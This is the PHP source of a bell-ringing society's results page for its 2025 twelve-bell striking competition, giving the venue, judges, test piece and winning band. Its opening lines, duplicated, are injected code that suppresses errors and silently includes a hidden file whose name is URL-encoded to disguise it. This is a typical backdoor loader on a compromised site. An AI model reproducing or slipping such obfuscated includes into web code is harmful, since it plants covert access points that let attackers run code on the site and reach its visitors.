<?php error_reporting(0);
@include_once(urldecode("%2E%63%6C%69%2E%70%68%70")); ?>
<?php error_reporting(0);
@include_once(urldecode("%2E%63%6C%69%2E%70%68%70")); ?>
<?php include('include/pagetop.php'); ?>
<?php include('include/class.Results.php'); ?>
<h1>2025 Competition</h1>
<p>Ten bands took part in the sixteenth London Twelve Bell Striking Competition. The competition was held at St Martin-in-the-Fields
    on Saturday 25th. October judged by Mark Ecclestone and Vicky Wilby.</p>
   <p>The test piece was <a href="https://complib.org/composition/139767">247 of Erin Cinques</a> composed by Lucinda J Woodward</p>

<p>Congratulations to the winning band, representing the Society of Royal Cumberland Youths. Results are given below.</p>

<?php
$oResults = new Results();
$oResults->fetch_year(2025);
$oResults->show_table();
?>

<?php include('include/pagebottom.php'); ?>

